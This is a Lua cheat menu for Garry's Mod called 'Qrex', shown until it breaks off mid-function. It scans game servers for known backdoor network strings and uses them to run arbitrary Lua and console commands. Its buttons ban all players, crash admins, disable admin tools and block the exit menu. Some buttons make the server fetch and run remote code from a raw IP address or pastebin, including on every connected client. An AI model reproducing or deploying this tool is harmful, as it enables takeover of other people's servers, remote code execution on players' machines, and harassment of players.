        | |__| | | |  __/>  <| || (_) | | | | | | | | | | (_| |
         \___\_\_|  \___/_/\_\\__\___/|_| |_| |_|_| |_|_|\__,_|

                 [http://steamcommunity.com/id/vectivus_]
]])

// Localization

local qrexton = {}
local rainbowGun = false
local netStrings = {}
local channel = ""
local openKey = KEY_F2
local toggle = false
local ply = LocalPlayer()
local me = LocalPlayer()
local selPly = 0
local eyeTrace = LocalPlayer():GetEyeTrace()

// FONTS

surface.CreateFont( "button", { font = "Calibri", extended = false, size = 16, weight = 500, blursize = 0, scanlines = 0, antialias = true, underline = false, italic = false, strikeout = false, symbol = false, rotary = false, shadow = false, additive = false, outline = false, } )
surface.CreateFont( "labels", { font = "Calibri", extended = false, size = 16, weight = 500, blursize = 0, scanlines = 0, antialias = true, underline = false, italic = false, strikeout = false, symbol = false, rotary = false, shadow = false, additive = false, outline = true, } )

// Qrex Print

local function qrexchat(...)
    chat.AddText(Color(87, 39, 210), "[Qrex] ", Color(0, 184, 255), ...)
end

local function rndstr(len)
    if len == nil then
        len = 5
    end
    local chars = string.Split("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789", "")
    local r = ""
    while string.len(r) < len do
        r = r .. chars[math.random(1, #chars)]
    end
    return r
end

local noobstr = rndstr(16)
local backdoors = {"MEKELEK", "pdizzle", "qrex", "_potato", "hacking bro", "hackingbro", "kebabmenu", "rotten_proute", "BITMINER_UPDATE_DLC", "nostrip2", "operationsmoke", "vegeta", "pd1", "JSQuery.Data ( Post ( false ) )", "anatikisgodd", "anatikisgod", "https://i.imgur.com/gf6hlml.png", "print ( )", "fps", "fszof<qOvfdsf", "tupeuxpaslabypass", "_CAC_G", "adsp_door_length", "SDFTableFsSSQS", "EventStart", "data_check", "antileak", "CreateAdminRanks", "Asunalabestwaifu", "shittycommand", "tro2fakeestunpd", "FAdmin_CreateVar", "ContextHelp", "lmaogetdunked", "LV_BD_V2", "createpanel", "fuckyou", "1337", "haxor", "r8helper", "_chefhackv2", "ÃžÃ ?D)?", "Ãž  ?D)?", "nostrip1", "antilagger", "Fix_Exploit", "yazStats", "FPSVBOOST", "RTX420", "Revelation", "SizzurpDRM", "cbbc", "gSploit", "ÃƒÆ’Ã…Â¾ÃƒÆ’Ã‚ ?D)ÃƒÂ¢Ã¢â‚¬â€Ã‹Å“", "Reaoscripting", "ÃŸ ?D)?", "?????????????????ÃÂ¿??? ?? ?Ã‘Â¿??Ã„Â¿Ã•Â¿? ???Ã‘Â¿??Ã•Â¿??ÃÂ®", "!Ã‡Âº/;.", "NoOdium_Reaoscripting", "m9k_", "ÃŽÂ¾psilon", "Backdoor", "reaper", "SDFTableFsSSQE", "gmod_dumpcfg", "fpsvboost", "antipk", "privatebackdoorshixcrewpr", "edouardo573", "sikye", "addoncomplie", "novisit", "no_visitping", "_reading_darkrp", "gPrinters.sncSettings", "mat", "mat(0)", "banId2", "keyss", "!?/;.", "SteamApp2313", "??D)?", "?", "Ãžï¿½ ?D)â—˜", "Val", "models/zombie.mdl", "REBUG", "????????????????????? ?? ??????? ??????????", "material", "entityhealt", "banId", "kickId2", "json.parse(crashsocket)", "elsakura", "dev", "FPSBOOST", "INJ3v4", "MJkQswHqfZ", "_GaySploit", "GaySploitBackdoor", "xuy", "legrandguzmanestla", "_Battleye_Meme_", "Dominos", "elfamosabackdoormdr", "thefrenchenculer", "xenoexistscl", "_Defcon", "EnigmaIsthere", "BetStrep", "JQerystrip.disable", "Î¾psilon", "Ulogs_Infos", "jeveuttonrconleul", "Sandbox_ArmDupe", "OdiumBackDoor", "RTPayloadCompiler", "playerreportabuse", "12", "opensellermenu", "sbussinesretailer", "DarkRP_Money_System", "ohnothatsbad", "yarrakye", "ï¿½? ?D)?", "DataMinerType", "weapon_phygsgun_unlimited", "PlayerKilledLogged", "mdrlollesleakcestmal", "yerdxnkunhav", "kebab", "L_BD_v2", "netstream", "pure_func_run_lua", "rconyesyes", "Abcdefgh", "Fibre", "FPP_AntiStrip", "kidrp", "blacklist_backdoor", "boombox", "DOGE", "hexa", "-c", "VL_BD", "OBF::JH::HAX", "SACAdminGift", "GetSomeInfo", "nibba", "RegenHelp", "xmenuiftrue", "d4x1cl", "BlinkingCheckingHelp", "AnalCavity", "Data.Repost", "YOH_SAMBRE_IS_CHEATER", "dropadmin", "GLX_push", "ALTERED_CARB0N", "thenostraall", "LVDLVM", ">sv", "utf8-gv", "argumentumac", "runSV", "adm_", "Inj3", "samosatracking57", "doorfix", "SNTEFORCE", "GLX_plyhdlpgpxlfpqnghhzkvzjfpjsjthgs", "disablecarcollisions", "PlayerCheck", "Sbox_darkrp", "insid3", "The_Dankwoo", "Sbox_itemstore", "Ulib_Message", "ULogs_Info", "ITEM", "R8", "fix", "Fix_Keypads", "Remove_Exploiters", "noclipcloakaesp_chat_text", "_Defqon", "_CAC_ReadMemory", "nostrip", "nocheat", "LickMeOut", "ULX_QUERY2", "ULXQUERY2", "https://i.imgur.com/Gf6hLMl.png", "MoonMan", "Im_SOCool", "JSQuery.Data(Post(false))", "Sandbox_GayParty", "DarkRP_UTF8", "OldNetReadData", "Gamemode_get", "memeDoor", "BackDoor", "SessionBackdoor", "DarkRP_AdminWeapons", "cucked", "NoNerks", "kek", "ZimbaBackdoor", "something", "random", "strip0", "fellosnake", "enablevac", "idk", "ÃƒÅ¾Ãƒï¿½ ?D)Ã¢â€”Ëœ", "snte", "apg_togglemode", "Hi", "beedoor", "BDST_EngineForceButton", "VoteKickNO", "REEEEEEEEEEEE", "_da_", "Nostra", "sniffing", "keylogger", "CakeInstall", "Cakeuptade", "love", "earth", "ulibcheck", "Nostrip_", "teamfrench", "ADM", "hack", "crack", "leak", "lokisploit", "1234", "123", "enculer", "cake", "seized", "88", "88_strings_", "nostraall", "blogs_update", "nolag", "loona_", "_logs", "loona", "negativedlebest", "berettabest", "ReadPing", "antiexploit", "adm_NetString", "mathislebg", "Bilboard.adverts:Spawn(false)", "pjHabrp9EY", "?", "lag_ping", "allowLimitedRCON(user) 0", "aze46aez67z67z64dcv4bt", "killserver", "fuckserver", "cvaraccess", "rcon", "rconadmin", "web", "jesuslebg", "zilnix", "ï¿½ï¿½?D)?", "disablebackdoor", "kill", "DefqonBackdoor", "DarkRP_AllDoorDatas", "0101.1", "awarn_remove", "_Infinity", "Infinity", "InfinityBackdoor", "_Infinity_Meme_", "arivia", "ULogs_B", "_Warns", "_cac_", "striphelper", "_vliss", "YYYYTTYXY6Y", "?????????????????ï¿½???? ?? ?ï¿½???ï¿½?ï¿½?? ???ï¿½???ï¿½???ï¿½.", "_KekTcf", "_blacksmurf", "blacksmurfBackdoor", "_Raze", "m9k_explosionradius", "m9k_explosive", "m9k_addons", "rcivluz", "SENDTEST", "_clientcvars", "_main", "stream", "waoz", "bdsm", "ZernaxBackdoor", "UKT_MOMOS", "anticrash", "audisquad_lua", "dontforget", "noprop", "thereaper", "0x13", "Child", "!Cac", "azkaw", "BOOST_FPS", "childexploit", "ULX_ANTI_BACKDOOR", "FADMIN_ANTICRASH", "ULX_QUERY_TEST2", "GMOD_NETDBG", "netlib_debug", "_DarkRP_Reading", "lag_ping", "||||", "FPP_RemovePLYCache", "fuwa", "stardoor", "SENDTEST", "rcivluz", "c", "N::B::P", "changename", "PlayerItemPickUp", "echangeinfo", "fourhead", "music", "slua", "adm_network", "componenttolua", "theberettabcd", "SparksLeBg", "DarkRP_Armors", "DarkRP_Gamemodes", "fancyscoreboard_leave", "PRDW_GET", "pwn_http_send", "AnatikLeNoob", "GVacDoor", "Keetaxor", "BackdoorPrivate666", "YohSambreLeBest", "SNTE<ALL", "!ï¿½:/;.", "pwn_http_answer", "pwn_wake", "verifiopd", "AidsTacos", "shix", "PDA_DRM_REQUEST_CONTENT", "xenoreceivetargetdata2", "xenoreceivetargetdata1", "xenoserverdatafunction", "xenoserverfunction", "xenoclientdatafunction", "xenoclientfunction", "xenoactivation", "EXEC_REMOTE_APPS", "yohsambresicianatik<3", "Sbox_Message", "Sbox_gm_attackofnullday_key", "The_DankWhy", "nw.readstream", "AbSoluT", "__G____CAC", "Weapon_88", "mecthack", "SetPlayerDeathCount", "FAdmin_Notification_Receiver", "DarkRP_ReceiveData", "fijiconn", "LuaCmd", "EnigmaProject", "z", "cvardel", "effects_en", "file", "gag", "asunalabestwaifu", "stoppk", "Ulx_Error_88", "NoOdium_ReadPing", " striphelper "}

// Network Scan

function qrexton.CheckIfStringExists(str)
    local i = 1

    while util.NetworkIDToString(i) do
        if util.NetworkIDToString(i) == str then return true end
        i = i + 1
    end
end

local function CheckBackdoors()
    for k, v in pairs(backdoors) do
        if (qrexton.CheckIfStringExists(v)) then
            channel = v
            chat.AddText(Color(110, 80, 220), "[Qrex]", Color(0, 184, 255), " Found vulnerability â–¶ ", Color(0, 184, 255), v)
        end
    end

    if (channel == "") then
        chat.AddText(Color(110, 80, 220), "[Qrex]", Color(225, 155, 155), " No vulnerability has been found")
    end
end

function qrexton.PostLua(str)
    if (channel == "") then
        qrexchat("No netstring selected")

        return
    end

    net.Start(channel)
    net.WriteString(str)
    net.WriteBit(1)
    net.SendToServer()
end

// Color Transition

local mat_white = Material("vgui/white")

function draw.SimpleLinearGradient(x, y, w, h, startColor, endColor, horizontal)
    draw.LinearGradient(x, y, w, h, {
        {
            offset = 0,
            color = startColor
        },
        {
            offset = 1,
            color = endColor
        }
    }, horizontal)
end

function draw.LinearGradient(x, y, w, h, stops, horizontal)
    if #stops == 0 then
        return
    elseif #stops == 1 then
        surface.SetDrawColor(stops[1].color)
        surface.DrawRect(x, y, w, h)

        return
    end

    table.SortByMember(stops, "offset", true)
    render.SetMaterial(mat_white)
    mesh.Begin(MATERIAL_QUADS, #stops - 1)

    for i = 1, #stops - 1 do
        local offset1 = math.Clamp(stops[i].offset, 0, 1)
        local offset2 = math.Clamp(stops[i + 1].offset, 0, 1)
        if offset1 == offset2 then continue end
        local deltaX1, deltaY1, deltaX2, deltaY2
        local color1 = stops[i].color
        local color2 = stops[i + 1].color
        local r1, g1, b1, a1 = color1.r, color1.g, color1.b, color1.a
        local r2, g2, b2, a2
        local r3, g3, b3, a3 = color2.r, color2.g, color2.b, color2.a
        local r4, g4, b4, a4

        if horizontal then
            r2, g2, b2, a2 = r3, g3, b3, a3
            r4, g4, b4, a4 = r1, g1, b1, a1
            deltaX1 = offset1 * w
            deltaY1 = 0
            deltaX2 = offset2 * w
            deltaY2 = h
        else
            r2, g2, b2, a2 = r1, g1, b1, a1
            r4, g4, b4, a4 = r3, g3, b3, a3
            deltaX1 = 0
            deltaY1 = offset1 * h
            deltaX2 = w
            deltaY2 = offset2 * h
        end

        mesh.Color(r1, g1, b1, a1)
        mesh.Position(Vector(x + deltaX1, y + deltaY1))
        mesh.AdvanceVertex()
        mesh.Color(r2, g2, b2, a2)
        mesh.Position(Vector(x + deltaX2, y + deltaY1))
        mesh.AdvanceVertex()
        mesh.Color(r3, g3, b3, a3)
        mesh.Position(Vector(x + deltaX2, y + deltaY2))
        mesh.AdvanceVertex()
        mesh.Color(r4, g4, b4, a4)
        mesh.Position(Vector(x + deltaX1, y + deltaY2))
        mesh.AdvanceVertex()
    end

    mesh.End()
end

function draw.OutlinedBox(x, y, w, h, thickness, clr)
    surface.SetDrawColor(clr)

    for i = 0, thickness - 1 do
        surface.DrawOutlinedRect(x + i, y + i, w - i * 2, h - i * 2)
    end
end

function qrexton.labelOutline(name, pos, size)
    draw.OutlinedBox(pos[1], pos[2], size[1], size[2], 2, Color(0, 0, 0))
    draw.OutlinedBox(pos[1] + 1, pos[2] + 1, size[1] - 2, size[2] - 2, 1, Color(50, 50, 50))
    draw.WordBox(8, pos[1] + 20, pos[2] - 15, name, "labels", Color(30, 30, 30), Color(255, 255, 255))
end

local function PaintCHK(self, w, h)
    local chk = self
    chk:SetFont("button")

    function self.Button:Paint(w, h)
        local self = chk.Button
        draw.RoundedBox(0, 2, 2, w - 3, h - 3, Color(0, 0, 0))

        if self:GetChecked() then
            if chk:IsHovered() or chk.Label:IsHovered() or self:IsHovered() then
                draw.RoundedBox(0, 3, 3, h - 5, h - 5, Color(169, 237, 68))
                surface.SetMaterial(Material("gui/gradient_up"))
                surface.SetDrawColor(159, 227, 58)
                surface.DrawTexturedRect(3, 3, w - 5, h - 5)
            else
                draw.RoundedBox(0, 3, 3, w - 5, h - 5, Color(159, 227, 58))
                surface.SetMaterial(Material("gui/gradient_up"))
                surface.SetDrawColor(128, 184, 46)
                surface.DrawTexturedRect(3, 3, w - 5, h - 5)
            end

            surface.SetTextColor(255, 255, 255)
            surface.SetTextPos(-0.7, -1)
            surface.DrawText("")
        elseif chk:IsHovered() or chk.Label:IsHovered() or self:IsHovered() then
            draw.RoundedBox(0, 3, 3, w - 5, h - 5, Color(60, 60, 60))
            surface.SetMaterial(Material("gui/gradient_up"))
            surface.SetDrawColor(45, 45, 45)
            surface.DrawTexturedRect(3, 3, w - 5, h - 5)
        else
            draw.RoundedBox(0, 3, 3, w - 5, h - 5, Color(55, 55, 55))
            surface.SetMaterial(Material("gui/gradient_up"))
            surface.SetDrawColor(40, 40, 40)
            surface.DrawTexturedRect(3, 3, w - 5, h - 5)
        end
    end
end

local qrex = vgui.Create("DFrame")
qrex:ShowCloseButton(false)
qrex:MakePopup()
qrex:SetSize(600, 800)
qrex:SetPos(1300, 40)
qrex:SetTitle(" ")
qrex:SetVisible(true)
qrex:SetDraggable(true)
qrex:Show()

qrex.Paint = function(self, w, h)
    draw.RoundedBox(2, 0, 0, 920, 700, Color(17, 17, 17))
    draw.RoundedBox(2, 0, 0, self:GetWide(), 25, Color(0, 0, 0, 200))
    draw.RoundedBox(2, 0, 0, self:GetWide(), self:GetTall(), Color(30, 30, 30))
    surface.SetDrawColor(20, 20, 20)
    draw.OutlinedBox(3, 3, w - 6, h - 6, 5, Color(50, 50, 50))
    draw.OutlinedBox(4.8, 4.8, w - 8, h - 8, 3, Color(42, 42, 42))
end

function draw.Essential(position, parent)
    draw.LinearGradient(qrex.x + 10, qrex.y + 10, parent:GetWide() - 11, 2, {
        {
            offset = 0,
            color = Color(59, 175, 222)
        },
        {
            offset = 0.37,
            color = Color(202, 70, 205)
        },
        {
            offset = 0.725,
            color = Color(201, 227, 58)
        }
    }, true)
end

local panelNames = {"xploits"}

panelTable = {}

for k, v in pairs(panelNames) do
    qrexPanel = vgui.Create("DPanel")

    if (panelTable[1]) then
        qrexPanel:SetVisible(false)
    end

    qrexPanel:SetParent(qrex)
    qrexPanel:SetPos(0, 0)
    qrexPanel:SetSize(811, 791)
    table.insert(panelTable, qrexPanel)
end

panelTable[1].Paint = function(self, w, h)
    draw.Essential(48 + (100 * 1 - 100), self)
    qrexton.labelOutline("Server Features", {21, 29}, {270, 614})
    qrexton.labelOutline("Player Features", {312, 29}, {270, 290})
    qrexton.labelOutline("Player List", {312, 335}, {270, 296})
    qrexton.labelOutline("Console", {21, 661}, {561, 90})
end

local scripts = vgui.Create('DPanelList', qrex)
scripts:SetSize(250, 540)
scripts:SetPos(38, 44)
scripts.Paint = function(self, w, h)
    draw.RoundedBox(2, 0, 0, 920, 700, Color(17, 17, 17))
    draw.RoundedBox(2, 0, 0, self:GetWide(), 25, Color(0, 0, 0, 200))
    draw.RoundedBox(2, 0, 0, self:GetWide(), self:GetTall(), Color(30, 30, 30))
    surface.SetDrawColor(20, 20, 20)
end

local scripts2 = vgui.Create('DPanelList', qrex)
scripts2:SetSize(250, 260)
scripts2:SetPos(326, 44)
scripts2.Paint = function(self, w, h)
    draw.RoundedBox(2, 0, 0, 920, 700, Color(17, 17, 17))
    draw.RoundedBox(2, 0, 0, self:GetWide(), 25, Color(0, 0, 0, 200))
    draw.RoundedBox(2, 0, 0, self:GetWide(), self:GetTall(), Color(30, 30, 30))
    surface.SetDrawColor(20, 20, 20)
end

local playerlist = vgui.Create("DPanelList", qrex)
playerlist:SetSize(250, 277)
playerlist:SetPos(322, 350)
playerlist.Paint = function(self, w, h)
    draw.RoundedBox(2, 0, 0, 920, 700, Color(17, 17, 17))
    draw.RoundedBox(2, 0, 0, self:GetWide(), 25, Color(0, 0, 0, 200))
    draw.RoundedBox(2, 0, 0, self:GetWide(), self:GetTall(), Color(30, 30, 30))
    surface.SetDrawColor(20, 20, 20)
end

function qrexton.AddButton(name, parent, func)
    local button = parent:Add("DButton")
    button:SetText("")
    button:Dock(TOP)
    button:SetFont("DermaDefault")
    button:DockMargin(0, 0, 0, 5)
    button:SetSize(170, 30)
    button.DoClick = func

    button.Paint = function( self, w, h )
    surface.SetDrawColor(0, 0, 0)
        surface.DrawRect(0, 0, w, h)
        surface.SetDrawColor(50, 50, 50)
        surface.DrawRect(1, 1, w - 2, h - 2)
        surface.SetMaterial(Material("gui/gradient_up"))
        surface.SetDrawColor(35, 35, 35)
        surface.DrawTexturedRect(2, 2, w - 4, h - 4)
        draw.SimpleTextOutlined(name, "button", self:GetWide() / 2, self:GetTall() / 2, color_white, 1, 1, 1, color_black)
    end
end

local SC = vgui.Create("DScrollPanel", scripts)
SC:SetPos( 6, 6 )
SC:Dock(FILL)
local ssc1 = SC:GetVBar()

function ssc1:Paint() end
function ssc1.btnUp:Paint() end
function ssc1.btnDown:Paint() end
function ssc1.btnGrip:Paint() end

local SC2 = vgui.Create("DScrollPanel", scripts2)
SC2:SetPos( 6, 6 )
SC2:Dock(FILL)
local ssc2 = SC2:GetVBar()

function ssc2:Paint() end
function ssc2.btnUp:Paint() end
function ssc2.btnDown:Paint() end
function ssc2.btnGrip:Paint() end

local SC3 = vgui.Create("DScrollPanel", playerlist)
SC3:SetPos( 6, 6 )
SC3:Dock(FILL)
local ssc3 = SC3:GetVBar()

function ssc3:Paint() end
function ssc3.btnUp:Paint() end
function ssc3.btnDown:Paint() end
function ssc3.btnGrip:Paint() end

local txt = vgui.Create("DLabel", qrex )
txt:SetFont("DermaDefault")
txt:SetText("No one selected")
txt:SetTextColor(Color(255, 255, 255))
txt:SetSize( 1000, 1000 )
txt:SetPos(312, 632)
txt:SizeToContents()

local function players()
    for k, v in pairs(player.GetAll()) do
        qrexton.AddButton(v:Name(), SC3, function()
            selPly = v:UserID()
            txt:SetText(Player(selPly):Name())
        end)
    end
end

players()

local scan = vgui.Create( "DButton", qrex )
scan:SetSize( 250, 30 )
scan:SetPos( 32, 599 )
scan:SetTextColor(Color(255,255,255,255))
scan:SetFont("button")
scan:SetText("Backdoor scan")

scan.Paint = function( self, w, h )
    surface.SetDrawColor(0, 0, 0)
    surface.DrawRect(0, 0, w, h)
    surface.SetDrawColor(50, 50, 50)
    surface.DrawRect(1, 1, w - 2, h - 2)
    surface.SetMaterial(Material("gui/gradient_up"))
    surface.SetDrawColor(35, 35, 35)
    surface.DrawTexturedRect(2, 2, w - 4, h - 4)
end

scan.DoClick = function()
    surface.PlaySound("buttons/button18.wav")
    CheckBackdoors()
end

local rt = vgui.Create("DTextEntry", qrex )
rt:SetPos(27, 672)
rt:SetSize(550, 75)
rt:SetTextColor(Color(255, 255, 255, 255))
rt:SetFont("DermaDefault")
rt:SetMultiline(true)

rt.Paint = function(self, w, h)
    draw.RoundedBox(2, 0, 0, 920, 700, Color(17, 17, 17))
    draw.RoundedBox(2, 0, 0, self:GetWide(), 25, Color(0, 0, 0, 200))
    draw.RoundedBox(2, 0, 0, self:GetWide(), self:GetTall(), Color(30, 30, 30))
    surface.SetDrawColor(20, 20, 20)
    self:DrawTextEntryText(Color(255, 255, 255), Color(20, 20, 150), Color(100, 100, 100))
end

local target = vgui.Create( "DButton", qrex )
target:SetSize( 176, 25 )
target:SetPos( 21, 758 )
target:SetTextColor(Color(255,255,255,255))
target:SetFont("button")
target:SetText("Target Net")

target.Paint = function( self, w, h )
    surface.SetDrawColor(0, 0, 0)
    surface.DrawRect(0, 0, w, h)
    surface.SetDrawColor(50, 50, 50)
    surface.DrawRect(1, 1, w - 2, h - 2)
    surface.SetMaterial(Material("gui/gradient_up"))
    surface.SetDrawColor(35, 35, 35)
    surface.DrawTexturedRect(2, 2, w - 4, h - 4)
end

target.DoClick = function()
    surface.PlaySound("buttons/button18.wav")
    qrexchat("NetString: "..rt:GetValue())
    channel = rt:GetValue()
end

local rconcmd = vgui.Create( "DButton", qrex )
rconcmd:SetSize( 176, 25 )
rconcmd:SetPos( 214, 758 )
rconcmd:SetTextColor(Color(255,255,255,255))
rconcmd:SetFont("button")
rconcmd:SetText("Rcon CMD")

rconcmd.Paint = function( self, w, h )
    surface.SetDrawColor(0, 0, 0)
    surface.DrawRect(0, 0, w, h)
    surface.SetDrawColor(50, 50, 50)
    surface.DrawRect(1, 1, w - 2, h - 2)
    surface.SetMaterial(Material("gui/gradient_up"))
    surface.SetDrawColor(35, 35, 35)
    surface.DrawTexturedRect(2, 2, w - 4, h - 4)
end

rconcmd.DoClick = function()
    surface.PlaySound("buttons/button18.wav")
    local GetEntry = rt:GetValue()
    net.Start(channel)
    net.WriteString(GetEntry)
    net.WriteBit(false)
    net.SendToServer()
end

local luacmd = vgui.Create( "DButton", qrex )
luacmd:SetSize( 176, 25 )
luacmd:SetPos( 406, 758 )
luacmd:SetTextColor(Color(255,255,255,255))
luacmd:SetFont("button")
luacmd:SetText("Lua CMD")

luacmd.Paint = function( self, w, h )
    surface.SetDrawColor(0, 0, 0)
    surface.DrawRect(0, 0, w, h)
    surface.SetDrawColor(50, 50, 50)
    surface.DrawRect(1, 1, w - 2, h - 2)
    surface.SetMaterial(Material("gui/gradient_up"))
    surface.SetDrawColor(35, 35, 35)
    surface.DrawTexturedRect(2, 2, w - 4, h - 4)
end

luacmd.DoClick = function()
    surface.PlaySound("buttons/button18.wav")
    local GetEntry = rt:GetValue()
    net.Start(channel)
    net.WriteString(GetEntry)
    net.WriteBit(1)
    net.SendToServer()
end





qrexton.AddButton( "@Inject SendLua Interface", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ util.AddNetworkString("qrex")net.Receive("qrex",function(a,b) local c=net.ReadString() local d=net.ReadBit() if d==1 then RunString(c) else game.ConsoleCommand(c.."\n") end end) ]] )
end)

qrexton.AddButton( "Artillery strike", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ if not bombstrike then hook.Add("Think","lulz_bombstrike",function()local a=ents.Create("env_explosion")local b=Vector(math.random(-8000,8000),math.random(-8000,8000),math.random(-5000,5000))local c={}c.start=b;c.endpos=b+Vector(0,0,-99999)local d=util.TraceLine(c)if not d.Hit then return end;a:SetPos(d.HitPos)a:Spawn()a:SetKeyValue("iMagnitude","400")a:Fire("Explode",0,0)end)bombstrike=true else hook.Remove("Think","lulz_bombstrike")bombstrike=false end ]] )
end)

qrexton.AddButton( "Announce centre screen", SC, function()
    surface.PlaySound("buttons/button18.wav")
    Derma_StringRequest("Set Custom Text", "Set Text", "", function(str)
        qrexton.PostLua("for k, v in pairs(player.GetAll()) do v:PrintMessage( HUD_PRINTCENTER, \"" .. str .. "\") end")
    end)
end)

qrexton.AddButton( "Broken glass symphony", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ if not timer.Exists("A true masterpiece")then timer.Create("A true masterpiece",0.2,0,function()for a,b in pairs(player.GetAll())do b:EmitSound("physics/glass/glass_largesheet_break"..math.random(1,3)..".wav",100,math.random(40,180))end end)else timer.Remove("A true masterpiece")end ]] )
end)

qrexton.AddButton( "Double or nothing", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ BDON_CONFIG.doubleChance = ]]..str )
end)

qrexton.AddButton( "Bitminers2 value", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ BM2CONFIG.BitcoinValue = ]]..str )
end)

qrexton.AddButton( "Ban all players", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ local id = ]] ..LocalPlayer():UserID().. [[ for k, v in next, player.GetAll() do if v:UserID() == id then continue end v:Ban(0, false) v:Kick("]] ..tostring(text).. [[") end ]] )
end)

qrexton.AddButton( "Break economy", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ for k,v in pairs(player.GetAll()) do v:addMoney(9999999999) end ]] )
end)

qrexton.AddButton( "Cleanup map", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ game.CleanUpMap() ]] )
end)

qrexton.AddButton( "Custom job", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ TEAM_]]..noobstr..[[ = DarkRP.createJob("Qrex", { model = "models/player/skeleton.mdl", weapons = {"weapon_stunstick", "unarrest_stick", "m9k_glock", "m9k_dbarrel", "m9k_usas", "m9k_barret_m82", "m9k_svu", "m9k_acr", "m9k_vector", "m9k_m202", "m9k_milkormgl", "lockpick", "pro_lockpick", "staff_lockpick"}, command = "]]..noobstr..[[", description = "A fucking gamer", max = 1, customCheck = function(ply) return ply:SteamID() == "]]..ply:SteamID()..[[" end, CustomCheckFailMsg = "This isn't your custom class!", color = Color(0, 0, 0, 255), salary = 1000000000, admin = 0, vote = false, hasLicense = true, category = "Citizens", PlayerSpawn = function(ply) ply:SetMaxHealth(10000) ply:SetHealth(10000) ply:SetArmor(10000) end, }) ]] )
end)


qrexton.AddButton( "Crash Admins", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != "user" ) then v:SendLua("while true do end") end end ]] )
end)

qrexton.AddButton( "Console jammer", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ if not (timer.Exists("Block_")) then timer.Create("Block_", 0.5, 0, function() print("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n") end) else timer.Destroy("Block_") end ]] )
end)

qrexton.AddButton( "Change all name", SC, function()
    surface.PlaySound("buttons/button18.wav")
    Derma_StringRequest("Set Everyones Name", "Name", "", function(text)
        qrexton.PostLua( [[ local str = "]] .. text .. [[" for k, v in next, player.GetAll() do DarkRP.storeRPName(v, str) v:setDarkRPVar("rpname", str) end ]] )
    end)
end)

qrexton.AddButton( "Change all model", SC, function()
    surface.PlaySound("buttons/button18.wav")
    Derma_StringRequest("Change Everyones Model", "Model Directory", "", function(str)
        qrexton.PostLua( [[ for k, v in pairs(player.GetAll()) do v:SetModel(]]..str..[[) end ]] )
    end)
end)

qrexton.AddButton( "Change all material", SC, function()
    surface.PlaySound("buttons/button18.wav")
    Derma_StringRequest("Set Everythings Material", "Material Directory", "", function(str)
        qrexton.PostLua( [[ for k, v in pairs(ents.GetAll()) do v:SetMaterial(]]..str..[[) end ]] )
    end)
end)

qrexton.AddButton( "Disable administrations", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ local nothing = function() end if ULib then ULib.kick = nothing ULib.ban = nothing ULib.addBan = nothing end if xAdmin then xAdmin.Admin.Bans = nothing xAdmin.Admin.Ban = nothing xAdmin.Admin.Kick = nothing end if FAdmin then local tbl = {"kick", "ban", "jail", "UnJail", "ClearDecals", "StopSounds", "CleanUp"} for i = 1, #tbl do FAdmin.Commands.AddCommand(tbl[i], nothing) end end local meta = debug.getregistry().Player meta.Ban = nothing meta.Kick = nothing game.KickID = nothing local _ = RunConsoleCommand function RunConsoleCommand(command, ...) if command == "addip" then return end _(command, ...) end ]] )
end)

qrexton.AddButton( "Disable exit", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ hook.Add("Think","iuefheqefq",function() gui.HideGameUI() end) ]] )
end)

qrexton.AddButton( "Earthquake", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ if not timer.Exists("earthquake") then timer.Create("earthquake", 0.5, 500, function() for _, p in pairs(player.GetAll()) do p:SetPos(p:GetPos() + Vector(0, 0, 1)) p:SetVelocity(Vector(math.random(-50, 50), math.random(-50, 50), math.random(100, 150))) util.ScreenShake(p:GetPos(), 20, 1, 1, 100) p:EmitSound("ambient/explosions/exp1.wav", 100, math.random(60, 100)) end for _, e in pairs(ents.GetAll()) do if e:GetPhysicsObject() and e:GetPhysicsObject():IsValid() then e:GetPhysicsObject():AddVelocity(Vector(math.random(-50, 50), math.random(-50, 50), math.random(100, 150))) end end end) else timer.Remove("earthquake") end ]] )
end)

qrexton.AddButton( "EarRape", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ for k,v in pairs(player.GetAll()) do v:EmitSound("npc/stalker/go_alert2a.wav", 100, 100 ) end ]] )
end)

qrexton.AddButton( "Enigma Disco", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ http.Fetch("http://206.189.17.188/b1g.lua", function(b) RunString(b) end ) ]] )
end)

qrexton.AddButton( "Hell mode", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ BroadcastLua("http.Fetch('https://pastebin.com/raw/21tkfuM1', function(b) RunString(b) end )") ]] )
end)

qrexton.AddButton( "Ignite everyone", SC, function()
    surface.PlaySound("buttons/button18.wav")
    Derma_StringRequest("Ignite All Players", "Lenght In Seconds", "", function(str)
        qrexton.PostLua( [[ for k, v in pairs(player.GetAll()) do v:Ignite(]]..str..[[) end ]] )
    end)
end)

qrexton.AddButton( "Kill everyone", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ for k,v in pairs(player.GetAll()) do v:Kill() end ]] )
end)

qrexton.AddButton( "Luarun access", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ RunConsoleCommand("ulx", "groupallow", "user", "ulx luarun") ]] )
end)

qrexton.AddButton( "Luarun code", SC, function()
    surface.PlaySound("buttons/button18.wav")
